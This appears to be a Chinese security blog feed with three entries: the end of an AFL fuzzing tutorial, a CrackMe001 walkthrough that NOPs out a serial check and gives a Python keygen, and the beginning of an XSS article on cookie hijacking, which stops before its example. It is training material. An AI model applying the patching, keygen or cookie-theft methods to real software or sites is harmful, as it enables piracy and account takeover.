[…params…]</span><br></pre></td></tr></table></figure><ul><li><code>-i</code>：指定测试用例所在的目录，表示从该目录中读取输入数据。</li><li><code>-o</code>：指定fuzz结果输出的目录</li><li><code>/path/to/program</code>：表示目标程序的路径</li><li><code>[...params...]</code>：表示其他可能的参数。</li></ul></li><li><p>从文件读取输入的目标程序来说，语法如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure></li></ul><p>使用如下命令执行fuzz：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i fuzz_in -o fuzz_out ./easy_test</span><br></pre></td></tr></table></figure><p>经过一个半小时的fuzz，总共找到了4条执行路径（对应前面的程序代码），8个crash。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326111143917.png" alt="image-20240326111143917"></p><h3 id="结束fuzz"><a href="#结束fuzz" class="headerlink" title="结束fuzz"></a>结束fuzz</h3><p>afl-fuzz永远不会停止，所以何时停止测试很多时候就是依靠afl-fuzz提供的状态来决定的。具体的几种方式如下所示:</p><ul><li>状态窗口的<code>cycles done</code>变为绿色;</li><li><code>afl-whatsup</code>查看afl-fuzz状态;</li><li><code>afl-stat</code>得到类似于afl-whatsup的输出结果;</li><li>定制 <code>afl-whatsup</code> -&gt;在所有代码外面加个循环就好;</li><li>用 <code>afl-plot</code> 绘制各种状态指标的直观变化趋势;</li><li><code>pythia</code>估算发现新crash和path概率。</li></ul><h3 id="结果分析"><a href="#结果分析" class="headerlink" title="结果分析"></a>结果分析</h3><h4 id="fuzz界面分析"><a href="#fuzz界面分析" class="headerlink" title="fuzz界面分析"></a>fuzz界面分析</h4><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326111143917.png" alt="image-20240326111143917"></p><p>根据上面的fuzz界面图：</p><ol><li><p><strong>process timing</strong>:</p><ul><li><p><strong><code>last new path</code></strong> : 表示自从最后一个新路径被发现以来经过的时间。这可以帮助你了解新路径发现的频率。</p><blockquote><p>如果这个字段产生了报错，如：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240329171431783.png" alt="image-20240329171431783"></p><p>可能是因为：</p><ol><li><strong>语法错误</strong>：检查你的测试用例和目标程序，确保它们的语法正确。</li><li><strong>测试用例不足</strong>：如果你提供的初始测试用例过于简单或不足以触发新的路径，AFL 可能无法有效地探索目标程序的状态空间。</li><li><strong>代码覆盖率低</strong>：目标程序的某些部分可能难以触及，导致 AFL 无法发现新的路径。</li><li><strong>目标程序简单</strong>：如果目标程序非常简单，可能只有很少的执行路径，因此 AFL 无法发现新的路径。</li><li><strong>配置问题</strong>：检查 AFL 的配置设置，确保它们适合你的测试目标和环境。</li></ol><p>接下来要及时修正，不然继续fuzz也是徒劳（因为路径是不会改变的），可以采取以下解决方案：</p><ul><li><strong>增加测试用例</strong>：提供更多或更复杂的初始测试用例，以帮助 AFL 探索新的路径。</li><li><strong>调整 AFL 设置</strong>：调整 AFL 的参数和设置，例如增加变异率或改变变异策略，以尝试发现新的路径。</li><li><strong>优化目标程序</strong>：如果可能，修改目标程序以增加可触及的代码路径。</li><li><strong>增加测试时间</strong>：延长测试的时间，给 AFL 更多的机会发现新的路径。</li><li><strong>检查目标程序</strong>：确保目标程序没有错误，且适合模糊测试。</li></ul></blockquote></li><li><p><code>last uniq crash</code>: 表示自从最后一个独特崩溃被发现以来经过的时间。</p></li><li><p><code>last uniq hang</code>: 表示自从最后一个独特挂起被发现以来经过的时间。</p></li></ul></li><li><p><strong>overall results</strong>：</p><ul><li><p><code>cycles done</code> : 表示 AFL 完成的模糊测试循环次数。每个循环包括一系列的变异测试用例。</p><blockquote><p>如果这个字段变绿就说明后面即使继续fuzz，出现crash的几率也很低了，可以选择在这个时候停止</p></blockquote></li><li><p><code>total paths</code> : 表示 AFL 发现的总路径数量。每个路径代表程序执行中的一个独特分支或状态。</p></li><li><p><code>unique crashes</code> : 表示 AFL 发现的独特崩溃数量。这些崩溃可能是潜在漏洞的指示。</p></li><li><p><code>unique hangs</code> : 表示 AFL 发现的独特挂起数量。挂起可能是由于程序陷入无限循环或其他无响应状态造成的。</p></li></ul></li></ol><ul><li><code>cycles done</code>：</li><li><code>uniq crashes</code>：代表的是crash的数量</li></ul><ol start="3"><li><p>cycle progress</p></li><li><p>map coverage</p></li><li><p>stage progress</p><p>包括正在测试的fuzzing策略、进度、目标的执行总次数、目标的执行速度。 执行速度可以直观地反映当前跑的快不快，如果速度过慢，我们可能需要进一步优化我们的Fuzzing。 </p></li><li><p>findings in depth</p></li><li><p>fuzzing strategy yields</p></li><li><p>path geometry</p></li></ol><h4 id="fuzz-out分析"><a href="#fuzz-out分析" class="headerlink" title="fuzz_out分析"></a>fuzz_out分析</h4><p>使用 <code>tree</code> 命令查看out文件夹的目录结构</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326162321739.png" alt="image-20240326162321739"></p><p>目录中文件的作用：</p><ul><li><strong>queue&#x2F;</strong>：存放所有具有独特执行路径的测试用例</li><li><strong>crashes&#x2F;</strong>： 存放能触发待测程序崩溃的测试样本</li><li><strong>hangs&#x2F;</strong> ：存发导致待测程序超时的测试样本</li><li><strong>fuzzer_stats</strong> - 文本文件，包含了fuzzer的实时统计信息，如执行速度、路径覆盖等度量指标。这个文件不断更新以反映当前的fuzzing状态。</li><li><strong>plot_data</strong> - 文本文件，包含了AFL执行过程中的统计数据。使用AFL的<code>afl-plot</code>工具处理<code>plot_data</code>文件，可以生成fuzz过程的可视化图像。</li><li><strong>fuzz_bitmap</strong> - 这是用来记录路径覆盖率的位图（coverage bitmap），非人类可读。AFL使用这个位图来跟踪程序在处理不同输入时执行的不同分支，用来帮助AFL识别新的、唯一的代码路径，以便后续生成更具有探索性的测试样本。</li></ul><p>查看 <code>fuzz_out/crashes</code> 文件夹，下面的十六进制文件即为产生崩溃的结果，</p><p>可以通过 <code>xxd</code> 命令查看对应测试用例的内容</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326161001683.png" alt="image-20240326161001683"></p><p>可以看到产生crash的用例都符合栈溢出漏洞的情况</p><h2 id="qemu模式——无源码黑盒测试"><a href="#qemu模式——无源码黑盒测试" class="headerlink" title="qemu模式——无源码黑盒测试"></a>qemu模式——无源码黑盒测试</h2><p>qemu模式为在没有源代码的情况下，直接对二进制程序进行fuzzing。注意此类方法准确度较低。</p><h3 id="下载安装qemu"><a href="#下载安装qemu" class="headerlink" title="下载安装qemu"></a>下载安装qemu</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> qemu_mode</span><br><span class="line">./build_qemu_support.sh</span><br></pre></td></tr></table></figure><p>当出现各种库的缺失报错，参考：<a src="https://blog.csdn.net/song_lee/article/details/105082092">深入分析 afl &#x2F; qemu-mode(qemu模式) &#x2F; afl-unicorn 编译及安装存在的问题以及相应的解决方案</a></p><p>然后修改 <code>build_qemu_support.sh</code> 文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QEMU_URL=&quot;http://download.qemu-project.org/qemu-$&#123;VERSION&#125;.tar.xz&quot;</span><br></pre></td></tr></table></figure><p>修改为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QEMU_URL=&quot;http://download.qemu.org/qemu-$&#123;VERSION&#125;.tar.xz&quot;</span><br></pre></td></tr></table></figure><p>删除掉红框部分</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326201217863.png" alt="image-20240326201217863"></p><p>找到下面这部分</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326201323845.png" alt="image-20240326201323845"></p><p>删除后三行，更换为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patch -p1 &lt;../patches/syscall2.diff || exit 1</span><br><span class="line">patch -p1 &lt;../patches/memfd_create.diff || exit 1</span><br></pre></td></tr></table></figure><p>添加补丁文件 <code>paches/syscall2.diff</code> ,文件内容如下：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--- qemu-2.10.0-clean/linux-user/syscall.c2020-03-12 18:47:47.898592169 +0100</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0/linux-user/syscall.c2020-03-12 19:16:41.563074307 +0100</span></span><br><span class="line"><span class="meta">@@ -34,6 +34,7 @@</span></span><br><span class="line"> #include &lt;sys/resource.h&gt;</span><br><span class="line"> #include &lt;sys/swap.h&gt;</span><br><span class="line"> #include &lt;linux/capability.h&gt;</span><br><span class="line"><span class="addition">+#include &lt;linux/sockios.h&gt; // https://lkml.org/lkml/2019/6/3/988</span></span><br><span class="line"> #include &lt;sched.h&gt;</span><br><span class="line"> #include &lt;sys/timex.h&gt;</span><br><span class="line"> #ifdef __ia64__</span><br><span class="line"><span class="meta">@@ -116,6 +117,8 @@</span> int __clone2(int (*fn)(void *), void *ch</span><br><span class="line"> #include &quot;qemu.h&quot;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+extern unsigned int afl_forksrv_pid;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> #ifndef CLONE_IO</span><br><span class="line"> #define CLONE_IO                0x80000000      /* Clone io context */</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"><span class="meta">@@ -256,7 +259,9 @@</span> static type name (type1 arg1,type2 arg2,</span><br><span class="line"> #endif</span><br><span class="line"> </span><br><span class="line"> #ifdef __NR_gettid</span><br><span class="line"><span class="deletion">-_syscall0(int, gettid)</span></span><br><span class="line"><span class="addition">+// taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+#define __NR_sys_gettid __NR_gettid</span></span><br><span class="line"><span class="addition">+_syscall0(int, sys_gettid)</span></span><br><span class="line"> #else</span><br><span class="line"> /* This is a replacement for the host gettid() and must return a host</span><br><span class="line">    errno. */</span><br><span class="line"><span class="meta">@@ -6219,7 +6224,8 @@</span> static void *clone_func(void *arg)</span><br><span class="line">     cpu = ENV_GET_CPU(env);</span><br><span class="line">     thread_cpu = cpu;</span><br><span class="line">     ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line"><span class="deletion">-    info-&gt;tid = gettid();</span></span><br><span class="line"><span class="addition">+    // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+    info-&gt;tid = sys_gettid();</span></span><br><span class="line">     task_settid(ts);</span><br><span class="line">     if (info-&gt;child_tidptr)</span><br><span class="line">         put_user_u32(info-&gt;tid, info-&gt;child_tidptr);</span><br><span class="line"><span class="meta">@@ -6363,9 +6369,11 @@</span> static int do_fork(CPUArchState *env, un</span><br><span class="line">                mapping.  We can&#x27;t repeat the spinlock hack used above because</span><br><span class="line">                the child process gets its own copy of the lock.  */</span><br><span class="line">             if (flags &amp; CLONE_CHILD_SETTID)</span><br><span class="line"><span class="deletion">-                put_user_u32(gettid(), child_tidptr);</span></span><br><span class="line"><span class="addition">+                // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+                put_user_u32(sys_gettid(), child_tidptr);</span></span><br><span class="line">             if (flags &amp; CLONE_PARENT_SETTID)</span><br><span class="line"><span class="deletion">-                put_user_u32(gettid(), parent_tidptr);</span></span><br><span class="line"><span class="addition">+                // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+                put_user_u32(sys_gettid(), parent_tidptr);</span></span><br><span class="line">             ts = (TaskState *)cpu-&gt;opaque;</span><br><span class="line">             if (flags &amp; CLONE_SETTLS)</span><br><span class="line">                 cpu_set_tls (env, newtls);</span><br><span class="line"><span class="meta">@@ -11402,7 +11410,8 @@</span> abi_long do_syscall(void *cpu_env, int n</span><br><span class="line">         break;</span><br><span class="line"> #endif</span><br><span class="line">     case TARGET_NR_gettid:</span><br><span class="line"><span class="deletion">-        ret = get_errno(gettid());</span></span><br><span class="line"><span class="addition">+        // taken from https://patchwork.kernel.org/patch/10862231/</span></span><br><span class="line"><span class="addition">+        ret = get_errno(sys_gettid());</span></span><br><span class="line">         break;</span><br><span class="line"> #ifdef TARGET_NR_readahead</span><br><span class="line">     case TARGET_NR_readahead:</span><br></pre></td></tr></table></figure><p>添加补丁文件 <code>paches/memfd_create.diff</code> ,文件内容如下：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">diff -ru qemu-2.10.0-clean/util/memfd.c qemu-2.10.0/util/memfd.c</span><br><span class="line"><span class="comment">--- qemu-2.10.0-clean/util/memfd.c      2018-11-20 18:11:00.170271506 +0100</span></span><br><span class="line"><span class="comment">+++ qemu-2.10.0/util/memfd.c    2018-11-20 18:11:13.398423613 +0100</span></span><br><span class="line"><span class="meta">@@ -37,7 +37,7 @@</span></span><br><span class="line"> #include &lt;sys/syscall.h&gt;</span><br><span class="line"> #include &lt;asm/unistd.h&gt;</span><br><span class="line"> </span><br><span class="line"><span class="deletion">-static int memfd_create(const char *name, unsigned int flags)</span></span><br><span class="line"><span class="addition">+int memfd_create(const char *name, unsigned int flags)</span></span><br><span class="line"> &#123;</span><br><span class="line"> #ifdef __NR_memfd_create</span><br><span class="line">     return syscall(__NR_memfd_create, name, flags);</span><br></pre></td></tr></table></figure><p>再运行 <code>./build_qemu_support.sh</code> ，终于成功了</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326201812776.png" alt="image-20240326201812776"></p><h3 id="使用qemu模式fuzz"><a href="#使用qemu模式fuzz" class="headerlink" title="使用qemu模式fuzz"></a>使用qemu模式fuzz</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i fuzz-in -o fuzz-out -Q ./mips-test</span><br></pre></td></tr></table></figure><p>和有源码fuzz的区别就是加上了一个参数 <code>-Q</code> </p><p>如果为文件输入记得在末尾加上 <code>@@</code></p><h1 id="报错问题"><a href="#报错问题" class="headerlink" title="报错问题"></a>报错问题</h1><p>在执行 <code>./afl-fuzz -i fuzz_in -o fuzz_out ./easy_test</code> 命令的时候，产生了如下报错：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326203348393.png" alt="image-20240326203348393"></p><p>按照报错信息，输入 <code>echo core &gt;/proc/sys/kernel/core_pattern</code>，提示权限不够的话可以输入以下代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> core | sudo <span class="built_in">tee</span> /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><blockquote><p>这里是因为重定向操作符 <code>&gt;</code> 在执行前就已经获得了 sudo 权限，但是 <code>echo</code> 命令本身并没有获得 sudo 权限。</p><p>解决方法是使用 <code>tee</code> 命令，因为 <code>tee</code> 命令可以将输入内容写入文件，而且可以使用 sudo 权限执行。</p></blockquote><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240326094802123.png" alt="image-20240326094802123"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><ul><li><a src="https://zhuanlan.zhihu.com/p/90037601">从AFL开始FUZZ之旅</a></li><li><a src="https://www.freebuf.com/articles/system/191536.html">AFL漏洞挖掘技术漫谈（一）：用AFL开始你的第一次Fuzzing</a></li><li><a src="https://blog.csdn.net/zhongzhehua/article/details/117717656">利用AFL进行模糊测试</a></li><li><a src="https://zhuanlan.zhihu.com/p/680730032">模糊测试工具 AFL的原理与实践</a></li><li><a src="https://blog.csdn.net/weixin_51214674/article/details/134646388?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522171145366716800182756803%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=171145366716800182756803&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~timeliness~default-3-134646388-null-null.142^v100^pc_search_result_base2&utm_term=afl%20qemu%E5%AE%89%E8%A3%85">模糊测试FUZZ——AFL安装使用</a></li><li><a src="https://paper.seebug.org/842/">AFL 漏洞挖掘技术漫谈（二）：Fuzz 结果分析和代码覆盖率</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工程记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模糊测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『逆向』CrackMe001 逆向分析</title>
      <link href="/posts/fadc.html"/>
      <url>/posts/fadc.html</url>
      
        <content type="html"><![CDATA[<h1 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h1><p><strong>160个CrackMe的打包文件下载地址：</strong><a href="https://www.lanzoub.com/ipwFHha3bbc">https://www.lanzoub.com/ipwFHha3bbcc</a> 密码:52pj</p><p>win10虚拟机：<a src="https://blog.csdn.net/lvlheike/article/details/120398259">VMware中安装win10教程</a></p><p>IDA pro7.2：<a src="https://blog.csdn.net/Henryli1202/article/details/135072651">逆向分析学习小纪——IDA Pro工具的安装与基本使用</a></p><p>ollydby1.0 ：<a src="https://blog.csdn.net/fittec/article/details/126825758">OllyDbg下载与安装</a></p><h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p>选择CrackMe–001的 <code>Acid burn.exe</code> 进行逆向分析</p><p>首先运行程序，看看程序的功能</p><p>可以看到程序提供了两种登陆方法，分别是：通过序列号和用户名验证，和单独通过序列号验证</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401171549838.png" alt="image-20240401171549838"></p><p>选择serial登陆模式，随便输入，弹窗显示验证失败</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402112538216.png" alt="image-20240402112538216"></p><p>serial+name登陆方式也一样。</p><p>破解的思路如下：</p><p>因为程序后台肯定是由一个正确的序列号的（不管是代码写死的，还是动态生成的，反正在点击验证按钮的时候，这个序列号肯定是生成好的）。这里出现了对话框，说明作者在校验注册码之后发现如果错误了就直接弹窗，所以只要找到弹出对话框的代码处，向上跟踪，就可以找出判断是否正确的地方了，从而进一步破解程序。</p><h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p>用Exeinfo PE工具查看该程序，得到信息如下图，可知该程序没有加壳，而且是用Delphi语言编写的。所以并不需要进行脱壳</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401113359966.png" alt="image-20240401113359966"></p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><p>接下来对程序进行爆破，修改代码使得输入任何子串都提示正确或成功；</p><p>首先将程序放到OD中，Debug –&gt; Run运行程序</p><p>选择serial+name登陆模式，随便输入，弹窗显示验证失败</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401171710770.png" alt="image-20240401171710770"></p><p>保持 Try Again 的窗口不要关，然后切换到 OD 界面，按F12暂停程序，进入调试状态。</p><p>点击 Window –&gt; 7 call stack of main thread ，或者直接点击工具栏中的 K 按钮，查看线程堆栈，额可以看到我们选中的这行应该就是弹窗对应的 <code>MessageBoxA函数</code></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401173244715.png" alt="image-20240401173244715"></p><p>选中这一行，右键选择show call跳转到对应的汇编代码出</p><p>跳转到的选中行就是反汇编之后，程序中控制弹出提示框的语句。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401173704942.png" alt="image-20240401173704942"></p><p>所以，序列号验证的逻辑肯定就在这句前面不远处。</p><p>往上翻，我们找到了 push ebp 这句代码，这句代码在汇编语言中，一般在程序入口会出现，在 <code>42A193</code> 这里 F2 打个断点</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401191338213.png" alt="image-20240401191338213"></p><p>重新运行程序（直接点击运行按钮或鼠标选中后按F9）</p><p>重新点击 <code>Check it baby</code> 按钮，在右下角堆栈处找到定位语句最近的一条<code>Return </code> 语句：</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401202513876.png" alt="image-20240401202513876"></p><p>右键 <code>Follow in Disassm..(反汇编跟随)</code>，这里直接连接了一个跳转，往下面翻，可以看到有这一段<code>JNZ</code>和<code>JMP</code>比较后跳转的两部分代码 Jnz 则进入Good job Dude, 否则就进入JMP Sorry</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401202933245.png" alt="image-20240401202933245"></p><p>选中JNZ语句，右键选择 <code>Fill with NOPs</code>，通过nops(空指令填充)替换<code>JNZ</code></p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401203349476.png" alt="image-20240401203349476"></p><p>重新执行程序，仍然是输入 <code>aa</code> ，发现出现了验证失败弹窗，往前翻，发现在执行选择之前有一个审查，如果serial小于4直接验证失败</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402000609854.png" alt="image-20240402000609854"></p><p>所以我们再重新执行，输入 <code>aaaa</code>，可以看到成功绕过</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240401212619104.png" alt="image-20240401212619104"></p><h2 id="分析序号生成算法"><a href="#分析序号生成算法" class="headerlink" title="分析序号生成算法"></a>分析序号生成算法</h2><p>从这里的反汇编部分代码，可以看到用户名的计算算法流程， 首先取出用户名的第一位，乘以0x29。然后再乘以2。保留结果。假设结果为16BE，也就是十 进制的5822</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402000725167.png" alt="image-20240402000725167"></p><p>接着，将计算的结果转为字符串，然后和实现准备好的字符串进行拼接，结果为—— CW-5822-CRACKED 这个就是序 列号，也就是说序列号是根据用户名动态生成的。</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402001450319.png" alt="image-20240402001450319"></p><h2 id="注册机"><a href="#注册机" class="headerlink" title="注册机"></a>注册机</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 密码</span></span><br><span class="line">    key1 = <span class="string">&quot;CW&quot;</span></span><br><span class="line">    key2 = <span class="string">&quot;CRACKED&quot;</span></span><br><span class="line">    <span class="comment"># 输入用户名</span></span><br><span class="line">    username = <span class="built_in">input</span>(<span class="string">&quot;请输入用户名 长度必须大于等于4: &quot;</span>)</span><br><span class="line">    <span class="comment"># 判断长度</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(username) &lt; <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;长度必须大于等于4,请重新输入\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="comment"># 根据用户名生成密码</span></span><br><span class="line">    <span class="comment"># 计算用户名的第一位</span></span><br><span class="line">    username1 = <span class="built_in">ord</span>(username[<span class="number">0</span>])</span><br><span class="line">    result1 = (username1 &lt;&lt; <span class="number">0x3</span>) - username1  <span class="comment"># 左移0x3位再减去原来的值</span></span><br><span class="line">    <span class="comment"># 计算用户名第二位</span></span><br><span class="line">    username2 = <span class="built_in">ord</span>(username[<span class="number">1</span>])</span><br><span class="line">    result1 = (username1 &lt;&lt; <span class="number">0x4</span>) + result1  <span class="comment"># 左移4位再加上原来的结果</span></span><br><span class="line">    <span class="comment"># 计算用户名的第四位</span></span><br><span class="line">    username4 = <span class="built_in">ord</span>(username[<span class="number">3</span>])</span><br><span class="line">    result2 = username4 * <span class="number">0xB</span>  <span class="comment"># 乘以0xB</span></span><br><span class="line">    <span class="comment"># 计算用户名的第三位</span></span><br><span class="line">    username3 = <span class="built_in">ord</span>(username[<span class="number">2</span>])</span><br><span class="line">    result2 = (username3 * <span class="number">0xE</span>) + result2  <span class="comment"># 乘以0xE再加上第四位的结果</span></span><br><span class="line">    <span class="comment"># 再次计算第一位</span></span><br><span class="line">    result3 = username1 * <span class="number">0x29</span> * <span class="number">2</span>  <span class="comment"># 乘以0x29再乘以2</span></span><br><span class="line">    <span class="comment"># 将result3转为ASCII 并拼接密钥</span></span><br><span class="line">    key = <span class="string">f&quot;<span class="subst">&#123;key1&#125;</span>-<span class="subst">&#123;result3&#125;</span>-<span class="subst">&#123;key2&#125;</span>&quot;</span></span><br><span class="line">    <span class="comment"># 打印key</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;密钥为:<span class="subst">&#123;key&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行程序，随便输入一个用户名</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402112453492.png" alt="image-20240402112453492"></p><p>程序根据输入的用户名算出了一组序列号，输入到目标程序里，成功进入</p><p><img src="https://isodatop.oss-cn-beijing.aliyuncs.com/img/image-20240402112440883.png" alt="image-20240402112440883"></p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a src="https://blog.csdn.net/wenxuhonghe/article/details/95638925">CrackMe 实战】逆向破解实战之 001 Acid burn.exe</a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『跨站脚本攻击』XSS攻击进阶——XSS payload</title>
      <link href="/posts/a4a5.html"/>
      <url>/posts/a4a5.html</url>
      
        <content type="html"><![CDATA[<h1 id="什么是-XSS-payload"><a href="#什么是-XSS-payload" class="headerlink" title="什么是 XSS payload"></a>什么是 XSS payload</h1><p>当发现网站存在XSS漏洞时，攻击者能够对该网站植入恶意脚本，通过恶意脚本，控制用户的浏览器。这些<strong>用以完成各种具体功能的恶意脚本</strong>，被称为XSS Payload。</p><blockquote><p>XSS Payload实际上就是JavaScript脚本（还可以是 Flash或其他富客户端的脚本)，所以任何JavaScript脚本能实现的功能，XSS Payload都能做到</p></blockquote><h1 id="最常见的XSS-payload——Cookie劫持"><a href="#最常见的XSS-payload——Cookie劫持" class="headerlink" title="最常见的XSS payload——Cookie劫持"></a>最常见的XSS payload——Cookie劫持</h1><ol><li><p><strong>概念</strong></p><p>最常见的XSS Payload，就是通过读取浏览器的Cookie对象，从而发起“Cookie劫持”攻击。</p><blockquote><p>Cookie中一般加密保存了当前用户的登录凭证。Cookie如果丢失，往往意味着用户的登录凭证丢失。换句话说，攻击者可以不通过密码，而直接登录进用户的账户。</p></blockquote></li><li><p><strong>例子</strong></p><p>如下所示，攻击者可以先构造一个含恶意参数的url</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 